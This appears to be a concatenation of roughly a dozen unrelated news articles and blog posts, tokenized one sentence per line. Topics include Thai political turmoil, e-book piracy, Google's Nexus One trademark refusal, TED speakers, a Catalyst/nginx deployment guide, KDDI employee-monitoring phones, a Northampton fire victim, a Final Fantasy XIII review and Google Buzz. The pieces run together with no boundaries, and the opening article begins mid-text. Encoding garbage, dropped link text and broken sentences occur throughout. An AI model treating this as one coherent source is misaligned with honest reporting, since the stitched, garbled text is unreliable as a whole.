In 2006 , Bangkok ’s upper classes launched noisy street protests under the banner of the People ’s Alliance for Democracy .
Just like the old German Democratic Republic , the PAD called itself democratic precisely because it was n’t .
Its protests did n’t attract many followers from outside Bangkok ; one of its proposals was that a number of elected members of parliament should be replaced by appointees , presumably because the rural poor could not be trusted at the ballot box .
Dressed in yellow , the colour of Thailand ’s monarchy , PAD demonstrators occupied parliament and , later , Bangkok ’s main airport .
During the siege of parliament , someone set off a car bomb , and in the subsequent clashes two people were killed and at least 400 injured .
The security forces often stood by as the PAD ran roughshod ; some police officers even exuberantly put their arms round PAD protesters holed up in the airport .
After the September 2006 coup , young women put garlands on soldiers patrolling the streets of Bangkok , unconcerned that the PAD had invited back into politics a force that has launched 18 coup attempts since 1932 .
( The US and most other Western nations took a benign view of the coup ; although Washington formally condemned the takeover it did not cancel joint military exercises with Thailand , and privately made it clear that the bilateral relationship would be unaffected . )
‘ The military was the best option , ’ one long - time Thai diplomat told me .
‘ We had to stop democracy to save democracy . ’
Street demonstrations seem to have become a permanent fixture in Bangkok .
After the coup , and the subsequent questionable judicial decisions which disqualified pro-Thaksin candidates from standing as prime minister , the elites were able to instal Abhisit Vejjajiva , a suave young British - educated technocrat who was about as comfortable dealing with the working class as Prince Philip .
( Following the coup , Thaksin went into exile , and now spends much of his time in Dubai , from where he regularly broadcasts messages back to Thailand . )
Convinced , with some reason , that they had been disenfranchised , the rural poor dressed themselves in red , Thaksin ’s colour , and marched on Bangkok .
Like the yellow shirts , the red shirts were prepared to use violence .
Last April , gunmen pulled alongside the car of Sondhi Limthongkul , the head of the PAD , and fired at it .
He survived , though doctors had to remove bullet fragments from his skull .
That same week , red shirt protesters in Bangkok clashed with the police and army , torching cars , firing rifles and lobbing small bombs .
( In a twist typical of Thailand , famous for its sexual tolerance , transvestites in red shirts reportedly taunted the military with impromptu stripteases . )
Not surprisingly , the constant political turmoil has affected Thailand ’s economy , already hit hard by the global financial crisis , since the country depends not only on tourism but on manufacturing exports to the West .
The boom times of the early 1990s , when chauffeured Mercedes clogged Bangkok ’s streets , seem like another age .
The economy contracted by more than 3 per cent in 2009 , and its long - term future appears little brighter .
Major employers like Toyota are slashing jobs , and a weak education system means that the country produces few successful entrepreneurs .
After the coup , the military , led by a Muslim general , initially attempted to soothe tensions in the south .
But conciliation proved futile .
By the end of 2008 , more than 3000 people had been killed in the south since the beginning of the decade .
Bangkok still refuses to consider any form of real autonomy for the region , although many southerners agree that this would be the only solution .
The violence has begun to spill into Malaysia , and has ruined any hope of economic integration across the Thai - Malay border .
McCargo is pessimistic about the future :
The militants are now in the ascendant …
In some areas [ of the south ] movement sympathisers constitute more than half or two - thirds of the population , though some of these are passive sympathisers who are playing along largely as a survival strategy .
In many parts of the three provinces , the Thai state has little real authority …
Their incompetence and lack of stomach for fighting exposed , the Thai military sought to subcontract and privatise the conflict …
There was little evidence that anyone could stop the militant violence .
It is difficult to see a way back to stability .
Right now , even a free election would be unlikely to calm things down .
As Montesano notes , it would probably return Thaksin or his proxies to power , which would provoke his enemies all over again .
The rural poor will never go back to the days when they simply accepted the rule of Bangkok .
Yet the elites remain unwilling to give up any of their power .
The anti-Thaksin forces are doing nothing to help calm the situation .
In recent years , Thailand ’s courts have been on the offensive against the former prime minister .
Some observers speak of a judiocracy : courts hand down decisions hamstringing opponents of the Democrats , the military and the crown .
( The king has given several speeches essentially calling on the judiciary to play precisely this role . )
People on the wrong side of court decisions are given little room to appeal .
In February the courts seized the majority of Thaksin ’s assets ; his allies vowed to fight on , calling for a million - person march in Bangkok .
With Thaksin gone , his supporters have formed their own self - sustaining networks , which will probably survive even if he is no longer able to fund them .
From exile , Thaksin promises : ‘ I have n’t received justice and I will not give up . ’
Thailand ’s globalised economy may lead to even greater inequality between those who benefit from trade and investment and those , in the countryside , who do not .
The Thais are also divided by religion : the violence in the south has turned Muslims against Buddhists , generating tensions between the two groups in other parts of the country .
Meanwhile , Bhumibol ’s health is declining .
At 83 , he is the world ’s longest reigning monarch , and the only remaining force holding Thai society together .
There is good reason to fear that the political system will disintegrate after his death .
Though in theory a constitutional monarch , the king actually wields great power .
The government is advised , quietly , by his privy council of shadow ministers , a group McCargo calls the ‘ network monarchy ’ .
At critical moments , Bhumibol has mediated between opposing political forces ; he helped to end previous protests against the military in 1973 and 1992 before too much blood had been spilled .
Strict lèse majesté laws protect the king from public criticism and many
Thais worship him almost as a god ( indeed , the palace and various members of the political elite are essentially campaigning for his deification ) .
In recent months , worn down by frequent fevers , he has rarely ventured out in public ; in the autumn , rumours of a turn for the worse in his health sent the stock market tumbling .
Even in this condition , many
Thais still hope that the king might bring the yellow and the red shirts together , for who else is there ?
Not his son and heir apparent , Crown Prince Maha Vajiralongkorn , a hothead who enjoys little respect even among the Thais who idolise his father .
Many monarchists , who already despise Thaksin for challenging the power of the king , fear that the crown prince , who is known to be close to Thaksin , will create an opportunity for the exile to return .
Few will speculate in public about the king ’s future , but everyone tacitly admits that the country , which has muddled through so many crises , might collapse when he dies .
According to one Thai legend , the Chakri dynasty , founded in 1782 , will perish after its ninth monarch dies .
Bhumibol , also known as Rama IX , is the ninth Chakri king .
A study by a company that helps track pirated digital books estimates that there were 9 million illegal downloads of copyrighted books in the final months of last year .
Attributor , which works for publishers including Hachette Book Group and John Wiley & Sons , scanned 25 Web sites that offer readers downloadable content , looking for 913 titles across categories ranging from business and investing to fiction .
It found , for example , that illegal copies of “ Freakonomics , ” by Steven D. Levitt and Stephen J. Dubner , were downloaded 1,082 times and “ Angels & Demons , ” by Dan Brown , 7,951 times .
The study did not track any titles published by the company ’s clients , which would exclude the oft - pirated “ Twilight ” series published by Hachette .
Rich Pearson , general manager of Attributor , said although not every pirated copy represented a lost sale , the potential loss to the publishing industry could be as high as $ 3 billion .
Some analysts doubted that piracy was as big a problem for the book industry as the study suggested .
Mike Shatzkin , chief executive of Idea Logical Company , a book industry consultant , said many people who might illegally download an e-book would never have bought it in the first place .
Google 's bid for a trademark on its Nexus One smartphone has been denied by the U.S. Patent and Trademark Office , which concluded last week that the name is too similar to a trademark held by Portland - based Integra Telecom .
" Registration of the applied - for mark is refused because of a likelihood of confusion with the mark in U.S. Registration No. 3554195 , " the trademark office wrote in its March 9 ruling .
That trademark has been held since 2008 by Integra , which provides phone , Internet and other telecom services to small and midsized businesses .
According to Integra 's filing , it registered the term " NEXUS " to describe a series of calling services , excluding those offered to " participants in the physical oil industry . "
That does n't sound like a smartphone , but in his decision , trademark examining attorney David Taylor cited established law holding that " The goods and / or services of the parties need not be identical or directly competitive to find a likelihood of confusion . "
Taylor concludes that the " mobile phones " category in which Google seeks a trademark is encompassed by the broad range of services Integra offers .
The trademark office 's decision has been noted by
, and
, among others .
Crave points out that Google 's already run into difficulties with the Nexus and Android names .
The family of Philip K. Dick considers it all
to the language in " Do Androids Dream of Electric Sheep ? "
As for Integra , it says that it has n't heard from Google , but that the Nexus brand is important to the Portland company :
Update , 3:41 p.m. : I 've updated the post to indicate that Integra 's trademark excludes services to the oil industry .
Previously , I 'd indicated incorrectly that Integra 's Nexus services was directed toward that industry .
In coming weeks , CNN.com will roll out a number of video interviews with interesting thinkers , scientists and artists .
Check CNN.com/OPINION and CNN.com / TECH for the latest .
Long Beach , California ( CNN ) --
Jane McGonigal is one of the most interesting inventors you 've never heard of .
The bubbly game designer -- whose optimism seems to flow out of her wild blond hair -- is trying to get the world to play a lot more online video games , and not just for the sake of fun .
The cooperative skills and hopefulness that people learn while pecking away at online games like World of Warcraft will help our society address real - world problems like climate change and nuclear arms proliferation , she says .
To get people to use less oil and mentor entrepreneurs in Africa , she also is developing games that merge the digital and real worlds .
" My goal for the next decade is to try to make it as easy to save the world in real life as it is to save the world in online games , " she said .
McGonigal was only one of dozens of provocateurs , thinkers , scientists , math nerds and musicians to wow audiences with offbeat ideas and plans for the future at the brainy TED Conference last week in Long Beach , California .
TED , which stands for " technology , entertainment and design , " and is pronounced like the common name , is a nonprofit dedicated to " ideas worth spreading . "
Some of the conference 's speakers -- like Bill Gates , Sarah Silverman and Jamie Oliver -- have names that precede them .
Far more , however , are of McGonigal 's stature :
They 're stirring things up in one corner of the world , but , as of yet , they 've escaped the mainstream spotlight .
That can stop now .
Here 's our list of nine other fascinating and generally under - the - radar people , all gleaned from a week at this year 's TED Conference :
Temple Grandin , autistic professor
Temple Grandin sees her autism as a gift , not a disability .
The professor at Colorado State University , who has become a prominent animal rights activist , spoke at TED about how people 's brains work in different ways -- and how that 's something that should be appreciated , not stigmatized .
Grandin , for instance , thinks in pictures , " like Google for images , " she said .
She also grabs hold of details , a brain function she feels could help politicians .
" I get satisfaction out of seeing stuff that makes real change in the real world , " she said .
" We need a lot more of that and a lot less abstract stuff . "
One of her biggest real - world accomplishments , she said , was that a mother recently told her that her autistic child had gone to college because of Grandin 's inspiration .
Grandin's life also is the subject of an HBO film .
Raghava KK , artist and cartoonist
Raghava KK started drawing caricatures of his teachers in elementary school .
To avoid getting in trouble , he said , he drew a flattering cartoon of his school 's principal and gave it to him as a gift .
From then on , he was allowed to mock his teachers in cartoons as he pleased .
He 's rarely stopped creating since those days growing up in India .
He 's made paintings people dance to , mocked world leaders with political cartoons , delved into the fashion world and splattered bold patterns on cars .
His motto : Start making something today ; and relish in the joy of creation , not the success of the end product .
" Do n't even believe in perfect , " he said .
Philip Howard , the anti-lawyer lawyer
A partner in the New York - based law firm Covington & Burling , Philip Howard is a crusader against the excesses of his own profession .
Howard , author of " Life Without Lawyers : Liberating Americans from Too Much Law , " gave a blistering talk at TED about how " the land of the free has become a legal minefield . "
He cited the Florida school district that banned running at recess as an example of how " people no longer feel free to act on their best judgment " for fear of getting sued .
" People are acting like idiots , " he said .
" For law to be a platform for freedom , people have to trust it . "
Howard pushes for policy changes in health care , education and other fields through an organization he founded , Common Good , which describes itself as " a non-profit , non-partisan legal reform coalition dedicated to restoring common sense to America . "
John Kasaona , Namibian conservationist
Some conservationists try to protect rhinos and elephants by keeping local people away from these animals .
John Kasaona , from rural Namibia , says the best way to save endangered beasts is to let villagers own them .
They should be able to protect them or eat them as they choose , he said .
Kasaona should know .
He watched his father morph from a poacher of endangered animals to their protector .
It 's in the best interest of his villagers to make that switch , he said , because it helps them bring in tourism money and to take pride in the wildlife all around them .
" You can milk tourism even in the dry season , " he said .
Esther Duflo , poverty economist
A 37 - year - old MacArthur " genius " award winner , and professor at MIT , Esther Duflo sidesteps the grand armchair debate about whether charitable aid to poor countries does more harm than good .
The French economist has been a champion of using random trials , like those used for prescription drugs , to test whether some aid policies work in the real world .
Such tests have shown , for example , that giving a kilo of lentils to a family in India to get them to immunize a child against disease sharply increases the rate of immunizations .
The same approach can be used to study the merits of giving out free bed nets to fight malaria and to examine ways to get children in developing countries to go to school .
Christopher Poole , founder of 4chan
4chan is one of the seedier message boards on the Internet .
All posts are anonymous .
Many are pornographic .
The 4 chan community is known for organizing protests , hacking into big - name sites , spreading smut and creating Internet " memes , " like LOLcats , those silly photos of cats making funny faces .
Christopher Poole , who goes by " moot " online , started the viral site when he was 15 years old .
Now 22 , Poole is one of the most intriguing personalities on the Internet .
He 's on a sort of crusade to protect anonymous speech , which he says is becoming the Internet 's " dinosaur " as sites like Facebook and Google convince people to put all kinds of details about their real lives online .
" If someone called you up on the phone and asked you all of these things [ people post online , ] you 'd say ' hell no ' and hang up , " he said .
" But now we 're flooding the Internet with information about ourselves , and I think that 's scary .
So I would like to see people push back . "
Nathan Myhrvold , inventor
In Nathan Myhrvold 's world , mosquito repellent is so old - fashioned .
The inventor , former Microsoft Corp. executive and CEO of Intellectual Ventures is developing a prototype device that would create walls of lasers that are impenetrable by malaria - causing mosquitoes .
Myhrvold demonstrated the technology at the TED Conference and said laser fortresses could surround health clinics in the developing world .
Sir Ken Robinson , writer and educator
Sir Ken Robinson has a beef with wristwatches .
People today do n't need them , he says , because they all carry mobile phones that tell the time .
" For people over 25 , we were born in a predigital world , " he said .
" So if you wanted to tell the time , you had to have a watch .
And it sounds like a very trivial example , but even with a very progressive group of people ... most people are still going on old habits .
Even if they 're groovy watches , they 're still unnecessary . "
The educator and author of " The Element : How Finding Your Passion Changes Everything " uses that example to argue that our education system is " absolutely dominated by habits of mind " and needs some rethinking , too .
He said teachers need to encourage people with various aptitudes , not just those who are good at tests .
That will help people find their passions , he said .
" It 's interested me for a very long time that most people have no real sense of what they 're capable of -- of what their talents are , " he said .
" And a lot of people -- in my experience , perhaps the majority -- live their lives doing things they 're not very much concerned with , or interested in . "
Our education system causes such woe , he said .
Mark Roth , reanimation specialist
We tend to think of life as an either / or proposition :
We are either dead or alive .
But , in fact , there are dormant stages in life -- bacterial spores that can last for millions of years ; eggs in human ovaries that can survive for up to 50 years ; and the familiar sea monkey , a kind of shrimp sold as a toy that goes into suspended animation and comes to life when put into water .
Mark Roth , of the Fred Hutchinson Cancer Research Center , is delving into the mysteries of life by putting animals into suspended animation through lowering the oxygen level of their environment .
He 's used hydrogen sulfide gas to put mice into a hibernating state and has put frogs and zebra fish into suspended animation for up to 24 hours without harm .
Roth 's team is learning whether these tools could apply one day to human beings in medical crises .
CNN 's Jarrett Bellini contributed to this report .
Note : this is not the canonical way , it just Works For Meâ „ ¢ – there are , no doubt , vast improvements that could be made .
YMMV .
0. ASSumptions
I ’m assuming that the server already has the Catalyst framework installed , and any other Perl modules your app requires ( that do n’t live in the app ’s lib directory ) .
For the purpose of example , the application will be called “ FooApp ” , and will be installed on the server at /home / sites / foo.example.org
I ’m assuming you want to run the application server privately ( bound only to the localhost address ) on port 8100 .
1. Upload what you need from your app
You need to make sure you ’ve got all of the Catalyst framework
From your application , you only need 4 things :
The ‘ lib ’ directory ( where all of your code is ! )
The ‘ root ’ directory ( where all of you static stuff is ) The ‘ script ’ directory ( where the FastCGI wrapper is )
The application config file ( okay , you do n’t need this if you put the config in you main App.pm file )
Upload them all to the /home / sites / foo.example.org directory .
If you ’re using the Template Toolkit view , you also need to make sure that the directory for compiled templates exists and is writeable by the nginx user .
2.Set up nginx
There ’s nothing particularly special here :
server { server_nameÂ foo.example.org ; # Let 's have a server alias as well server_nameÂ otherfoo.example.org ; access_logÂ /var/log/nginx/foo.access.log ; rootÂ Â /home / sites/foo.example.org ; # Serve static content statically expires +30d ; location /css { add_header Cache - control public ; root / home / sites/foo.example.org/root / ; } location / js { add_header Cache - control public ; root / home / sites/foo.example.org/root / ; } location / images { add_header Cache - control public ; root / home / sites/foo.example.org/root / ; } # We pass the rest to our FastCGI application server location / Â { #
We also set some headers to prevent proxies add_header Pragma " no- cache " ; add_header Cache - control " no- cache , must - revalidate , private , no - store " ; expires - 1s ; # Where our FastCGI app server is listening fastcgi_passÂ Â 127.0.0.1:8100 ; include /etc/nginx / fastcgi_params ; fastcgi_paramÂ Â SCRIPT_NAMEÂ Â Â Â / ; fastcgi_paramÂ Â PATH_INFOÂ Â Â Â Â Â $ fastcgi_script_name ; } }
I ’ve got all of the stuff that the Static : : Simple server was handling served by nginx directly , with nice Expiry : and Cache - control : headers to allow proxy / browser caches to be used ( no point serving them the same files again and again )
You should now be able to request the static content ( CSS / JavaScript / images ) from your site – if not , there ’s something wrong with your nginx configuration .
Fix it first .
IfÂ you try to run any part of the dynamic ( code ) side , you should get a nice “ 502 Bad Gateway ” message .
That ’s fine – it ’s what you want , in fact – as you ’re not running your app yet . 🙂
3 . Run your application server
This involves running the FastCGI wrapper script from the ‘ script ’ directory you uploaded .
Important : if you use a config file , you need to move it inside of the lib / $ appname directory for it to be read .
It ’s probably a very good idea to run the FastCGI server manually , with “ CATALYST_DEBUG=1 ” , to make sure the app works properly .
Once you ’ve confirmed it works , you can add it to the system startup .
Here ’s the init.d file I use : ( probably very Debian specific )
#! /bin/sh ### BEGIN INIT INFO # Provides : Â Â Â Â Â Â Â Â Â application - catalyst - foo # Required - Start : Â Â Â $local_fs $ network # Required - Stop : Â Â Â Â $local_fs $ network # Default - Start : Â Â Â Â 2 3 4 5 # Default - Stop : Â Â Â Â Â 0 1 6 # Short - Description : Starts the FastCGI app server for the " FooApp " site # Description : Â Â Â Â Â Â
The FastCGI application server for the " FooApp " site ### END INIT INFO PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
SITE_HOME=/home/sites/foo.example.com
DAEMON=$SITE_HOME/script/fooapp_fastcgi.pl OPTS= " -l :8100 -n 5 " NAME=catalyst-app-foo DESC = " ' Foo ' app server " USER=www - data test -f $ DAEMON || exit 0 set -e start_daemon ( ) { echo -n " Starting $ DESC : " start - stop - daemon -- start -- quiet -- pidfile / var / run / $ NAME.pid -d $ SITE_HOME \ -- exec /usr / bin/ perl -- startas $ DAEMON --chuid $ USER -- background -- make - pid -- $ OPTS echo " $ NAME . " } stop_daemon ( ) { echo -n " Stopping $ DESC : " start - stop - daemon -- stop -- signal TERM --pidfile / var /run / $ NAME. pid echo " $ NAME . " } reload_daemon ( ) { echo -n " Reloading $ DESC : " start - stop - daemon -- stop -- signal HUP -- pidfile / var / run / $ NAME. pid echo " $ NAME . " } case " $ 1 " in start ) start_daemon ;; stop ) stop_daemon ; ; reload ) reload_daemon ; ; restart|force - reload ) stop_daemon sleep 5 start_daemon ;; *)
N=/etc/init.d/$NAME echo " Usage : $ N { start|stop|reload|restart|force - reload} " > &2 exit 1 ; ; esac exit 0
In “ OPTS ” , we set the listening port for the app server – this must be the same as the nginx config , otherwise you ’re still going to get 502 errors .
I ’ve set 5 handlers – depending on your app , you may want to increase that number .
Add the initscript to whichever runlevels you want , so it ’ll be run on startup , and / or …
4 . Set up your favourite process monitor to ensure that the server is always running
I usually use monit – it ’s easy enough to set up , using the PID file and init script to check , start and stop the app server .
And that should be that – your Catalyst application should now be up and running through nginx .
If you follow Information Security at all or have been part of a PC vs .
Mac discussion at any level , you ’ve probably come across the timeless question of :
What ’s more secure , Mac or PC ?
Well , there ’s an analogy from renowned security researcher Charlie Miller that elegantly captures the answer in a single sentence :
Mac OS
X is like living in a farmhouse in the country with no locks , and Windows is living in a house with bars on the windows in the bad part of town .
In other words , less security with less exposure ( OS X ) vs. more security with more exposure ( Windows ) .
In short , having a secure operating system and being safe are two different things .
Exposure matters .
So even though Windows is technically more resistant to attack , people using it are still less safe than if they were to use OS X. ::

Ever since I was a child , I have been very interested in nature and the environment .
I have a B.S. degree in wildlife biology , and have worked as a zookeeper , wildlife biologist , and ecologist .
I am conducting a brief survey of world leaders , government officials , religious leaders , corporate CEOs , environmental groups , wildlife experts , and others regarding nature and the environment .
I am also very interested in religious views , customs , and beliefs from around the world , and the interactions between religion , culture , society , and the environment .
This is something I am doing out of personal interest , and is not connected to any group or organization .
I have been working on this project since the summer of 2006 , and hope to eventually turn it into a book and / or documentary .
I am hoping to make this into a global project , with responses from all segments of society .

Just occasionally , a bit of gear comes out that makes you wonder just whose side technology is on .
And none more than this cell - phone idea from the R&D geeks at KDDI Corporation , one of Japan ’s biggest cell - phone makers .
Spyware by any other name , the technology will enable bosses to use the accelerometer on their employees ’ phones to check up on whether they ’re working or not .
The idea is simple : software is embedded into an employee ’s mobile that is connected to a server that analyzes their movements via the phone ’s accelerometer .
At first , workers will have to input just what action they are performing into their mobiles so that their movements can be interpreted .
The system becomes more accurate as time goes on , recognizing each individual ’s movements .
So , if your boss has asked you to hoover up the nasal hair he clipped before nipping off to lunch with his secretary , he can make sure that you ’re performing the task he ’s set you , rather than sitting in front of his computer and checking up on your Facebook page–or his .
The press release has a rather quaint term for it –“ making central monitoring possible with workers at several different locations . ”
I have another term for it , but sadly it ’s not repeatable here .

This is an 11:26 a.m. update of a story posted at 8:17 this morning .
NORTHAMPTON – Northampton Police Department detective Lt. Kenneth J. Watson was on his way to work Friday morning when he saw a woman on fire in a Pleasant Street parking lot .
" I saw a person on fire walking , " Watson said , adding that the lower half of the woman 's body was in flames .
It was about 6:45 a.m. and Watson said woman was on the south side of 518 Pleasant St. , next to a dike that runs through the area .
She then walked around to the rear of the commercial building , Watson said .
Watson said he immediately called to report the fire and then went to the woman 's aid .
By the time he reached her , she had stripped off her clothes which were still burning besides her .
Watson said he found a container of gasoline additive next to the woman which he believes she used to set herself ablaze .
The woman , who suffered serious burns to her legs and arms , told Watson that she had just taken a taxi from Easthampton to Northampton .
Believed to be in her 40s , the woman was taken to Baystate Medical Center in Springfield and then transferred to Massachusetts General Hospital in Boston .
Police have yet to release her name .
Watson , who did not know the woman 's condition .
Capt . Scott A. Savino said earlier in the morning , however , that her injuries were not considered life - threatening .
An employee of the Dunkin Donuts store inside the Shell station , said the woman ordered a Coolata drink shortly before Watson spotted her in flames .
The building at 518 Pleasant is just north of the Interstate 91 overpass and across the street from a bowling alley .
It houses a number of busineses , including Behavioral Health Network and Anchor House , an artist cooperative for people with a history of mental health issues .
Arlene Figueroa , office manager of Behavioral Health Network , said she does not believe the woman was a client there .
The woman , Figueroa said , was reportedly a regular customer at the Shell station .
It ’s been almost four years since the last Final Fantasy .
A new generation of gaming , a long development cycle , and a controversial multi-platform announcement have all led us to the release of Final Fantasy XIII .
The first in a trilogy of XIII related games entitled Fabula Nova Crystallis ( with the other two parts being Versus for the PlayStation 3 and Agito for the PSP ) , Final Fantasy XIII is a new breed of Final Fantasy .
Story - wise , all the staples are there .
Each of the six protagonists was built on previous characters in the series , and while there ’s a noticeable amount of corny melodrama in the script , that ’s come to be expected from the franchise and many will find it endearing .
Set in the floating civilization of Cocoon and the looming world below known as Pulse , the game follows the exploits of six characters from different walks of life and their struggle against the corrupt government , powerful super - beings , and fate .
Most will recognize Lightning , the strawberry - haired heroine who adorns the box art , and she is accompanied by a motley crew of five others , all of whom receive a relatively equal amount of attention where character development and backstories are concerned .
As previously stated , the writing is hit - or - miss on occasion , but it ’s rarely preachy or awkward enough to warrant a cringe .
Earlier parts of the plot are told in a non-linear fashion as you follow each character separately with flashbacks filling in the gaps .
Unfortunately , further elaboration even into the game ’s first half hour would constitute spoilers , but rest assured that the plot will certainly hold your attention over the 50 + hours it ’ll take for you to beat the game .
The path that takes you through the game is remarkably linear , offering scant few opportunities for exploration .
There are no towns in the traditional sense seeing as save points function as shopping terminals .
Later on in the game , players will find a Calm Lands - like expanse full of enemies ripe for farming , but beyond that , it ’s a straight line to the next story cutscene with a few detours for hidden treasure chests .
However , the primary gameplay mechanic occupying those 50 + hours is , of course , the battle system .
Built off a modified version of the long standing Active Time Battle ( ATB ) system , combat in FFXIII is streamlined for speed , efficiency , and fun .
Veterans of the series will notice when control has been wrestled from their hands , but the game does a remarkable job of being your co-pilot when it comes to encounters .
The most immediate difference between this battle system and the 12 that preceded it is the fact that you only control one character in your party ; the leader .
With only three to a party , the computer takes charge of your companions and , for the most part , does exactly what the player would do if given the opportunity .
It ’s also worth mentioning that unlike in Final Fantasy XII , which had the Gambit system that allowed players to indirectly dictate AI behavior , FFXIII assumes full control over your allies when in battle .
The new ‘ Auto - Battle ’ option is also a Godsend that lets the game choose the best course of action , allowing players to breeze through smaller and incidental encounters .
Accompanying the ATB system , which has been changed to allow chain attacks and action queues , is the Role System .
Reminiscent of the Jobs Systems of the older titles , there are 6 Roles tailored for different play - styles , each with different abilities , perks , and disadvantages .
Commandos are brute - force attackers whereas Medics do nothing but heal the party .
When these Roles are combined , ‘ Paradigms ’ are formed , with some suited for offense and others suited for defense .
Knowing how to build Paradigms and play each character to his strengths is required to succeed in the battle , and battles that require on - the - fly Paradigm Shifts will definitely keep players on their toes .
Another vital part of combat is the new ‘ Stagger ’ mechanic .
Enemies have damage thresholds which , when reached , severely weaken their defenses .
Certain Roles and attack types give big boosts to the ‘ Stagger Gauge ’ whereas others keep it from dropping .
This requires players to employ more than the “ do the most damage at all times ” tactic and it ’s the only way you ’ll ever defeat some of the stronger enemies .
The final facet of battle is the Summon system .
Each character has a connection with an ‘ Eidolon ; ’ an incredibly powerful otherworldly creature who can be called upon in certain circumstances to provide a large offensive strike against a formidable foe .
Players will also grow to love the fact that your party ’s health is replenished after each battle .
It might seem like the game is making it too easy for you , but developers giveth and taketh away .
Even though Potions affect the entire party as opposed to one character and a ‘ Retry ’ option lets you restart moments before you enter the battle that resulted in your death , Gil is frustratingly scarce and opportunities for grinding are few and far between until later in the game .
While the early battles in the game might seem almost neutered , as new elements are introduced , the complexity of the battle system increases exponentially .
By about 10 hours in , the fact that the computer is controlling two thirds of your party will hardly be noticeable as you ’ll be far too busy timing your attacks and managing other elements .
It ’s a deceptively simple looking system that makes combat fast and frenetic and proves to be one of the best in the series .
Character development is based on two things : Roles and Equipment .
Each character has a set roster of abilities for each Role and it ’s all handled with the ‘ Crystarium ; ’ a tiered network of nodes similar to the Sphere Grid from Final Fantasy X. Certain characters are suited for certain roles and while there is a bit of wiggle - room in that area , it becomes clear that the developers intended there to be an ideal party .
The level of your character is dictated by his three stats ; HP , Strength , and Magic .
In addition to nodes on the Crystarium , what you have equipped will have a resounding effect on your proficiency in battle .
Only weapons and accessories are made available , but a somewhat shallow and sometimes complicated item modification and leveling system lets you improve your items with certain biological and mechanical components .
Serious thought is required when upgrading items , seeing as you ’ll never have the necessary components to max out all of your equipment , and an investment in the Official Game Guide is recommended to prevent needless trial & error .
The graphics , music , and voice acting are all excellent ( the latter to a lesser degree ) .
Load times are essentially non-existent on the PlayStation 3 version and the game runs beautifully , considering that no install is required .
The character models and environments are gorgeous and almost indistinguishable from the pre-rendered cutscenes and Masashi Hamauzu ’s score is a fantastic blend of orchestral and electronic tracks .
The battle theme is particularly noteworthy as it will stick in your head like barnacles to the hull of a ship .
Final Fantasy XIII does for this generation of gaming what Final Fantasy X did to the last .
While it might seem streamlined to a fault at first , players who take the time to settle in to the game ’s mechanics will be rewarded .
It sets a new standard for JRPG ’s and fans of the series owe it to themselves to play it .
Gofanboy has reported that inside sources at Microsoft have stated that the much speculated Xbox 360 Slim will be revealed at this year ’s E3 conference in June .
This rumour follows a recent development that the next Xbox 360 firmware update will implement USB storage functionality , as well a supposed leaked image of a new , much smaller , Xbox 360 motherboard .
Apparently , Microsoft will announce a price cut on current Xbox 360 consoles ( does not specify which models ) to $ 149 in a “ liquidation ” program .
Once all current Xbox 360 consoles have been cleared from shelves , they will launch the Xbox 360 Slim at $ 199 , and shortly after that it will be reduced to $ 149 .
Of course at this stage , it is just a rumour .
But just like the PS3 Slim rumours that circulated before the announcement last year , these particular rumours outline a strategy that makes sense .
Slimming down the console would reduce manufacturing and distribution costs , allowing for a retail price cut to follow .
Furthermore , USB storage capabilities will give Microsoft the freedom to release a Hardrive –free Xbox 360
Slim at an extremely low price , and users could simply use a USB storage device to save and update their games .
However , I do n’t see Microsoft getting rid of the harddrive all together , as USB storage would not be sufficient for those who like to install their games to disk , or download content from Xbox Live .
We will find out if there is any truth to the rumour in June , when Microsoft is supposedly scheduled to make the big announcement .
Discuss the Xbox 360 Slim in the forums
Today ’s NYT has what looks like a pretty pessimistic assessment .
While my predictions are worth just what you are paying for them here , my sense has been the opposite .
I think a major health care bill is more likely than not to pass .
After what she managed to get her caucus to do last year , I would never , ever bet against the Speaker on a vote .
And she is looking pretty determined on this one .
Keep in mind that it is not in the interest of the lawmakers who hold the key votes to show any flexibility at this point .
The real movement comes at the very last minute .
We ’ve seen this again and again and again .
Obama himself will have to do some arm - twisting — which means we may see some scenes like this one .
But until a vote has been scheduled , and we are within 48 hours of seeing it happen , take anything you hear from anyone on Capitol Hill with a full box of salt .
Disclaimer : I had two uncles who landed at Colleville sur Mer ( otherwise known as “ Omaha Beach ” ) on the 6th of June , 1944 and I do not mean for a beach landing analogy to refer to this particular event nor any of the nations or ideologies involved .
Beach landings happened throughout history including the one for the “ rescue ” of Helen of Troy .
Most have failed due to lack of follow - up , planning or resources .
It may just seem like its been a busy ( and snowy ) news week for social media enthusiasts , but what Google is attempting to do with Operation Google Buzz is a do - or - die business operation that could have $ Billions in consequences .
Unlike their training maneuver , Operation GoogleWave , this landing is serious .
Yahoo , with their Operation Meme and their Yahoo Buzz bookmarking feature , already failed to gain a decent foothold on the lucrative social media “ sharing ” continent .
Google can not afford to fail here .
The Google Buzz Micro-Blog landing this week has been surprisingly successful among early adopter types .
Robert Scoble , for instance , likes Buzz more than he did FriendFeed which is saying a lot .
But , just as a beach landing can be reversed disastrously without quick action , Google needs to move very quickly to consolidate its beachhead and move forward to gain significant user ground .
Right now , they cannot do this unless they fix some glaring deficiencies that could break their effort :
[ caveat : Google may fix these issues over the weekend if their programmers are on the ball – Update : they were n’t on the ball ]
1 ) First of all , Google needs to populate Buzz by allowing Gmail Account Holders to scan their Contact Lists for others who are on Google Buzz and Invite them enmasse like every other social network does via the reputable checkbox permission procedure .
Twitter and Facebook allow this and Orkut , owned by Google , allows this .
I am assuming that Google has temporarily left out the ability to scan one ’s own contacts for other Buzz members because they do n’t want to grow too quickly ( they do n’t want too many people on the beach the first week ) .
2 ) While it is great the Google Buzz differs from Twitter in allowing more than 140 characters per post , each post needs to have a button for would - be readers to shrink them down to a less than 200 character preview … the great thing about Twitter is one can easily scan more than 20 posts to see which ones warrant more attention ( Twitter probably could charge for premium accounts where Tweets open up to larger posts on a blog on page 2 ) .
3 ) This is critical :
When deciding whether to follow new followers back on Buzz , users must be able to see what that person ’s last post was ( or a bio ) without clicking further .
Twitter allows you to follow back or ignore or block without leaving a page .
Google Buzz currently forces a user to click through to see the activity of each new follower and that is a horrendous mistake .
It takes too much time .
Twitter is correct in allowing new followers to be judged by their last tweet or bio which is placed directly in the list of new followers .
4 ) When signing into Gmail , there should be a large and clearly labeled button or link that allows the Gmail account holder to build or edit his or her Google Profile in order to start buzzing ( great new verb by the way ) .
As of Friday the 12th , 3 days after the Google Buzz landing , it is still hard for a layperson to see how they can build their profile .
